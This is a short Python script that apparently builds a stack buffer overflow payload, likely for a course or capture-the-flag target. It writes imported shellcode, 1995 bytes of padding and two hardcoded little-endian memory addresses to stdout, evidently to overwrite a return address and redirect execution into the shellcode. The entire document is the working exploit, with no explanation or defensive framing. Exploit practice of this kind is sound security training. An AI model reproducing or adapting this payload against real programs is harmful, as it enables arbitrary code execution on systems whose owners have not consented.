from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*1995)
sys.stdout.buffer.write(0xfff6e1c8.to_bytes(4, 'little'))
sys.stdout.buffer.write(0xFFF6E9D4.to_bytes(4, 'little'))


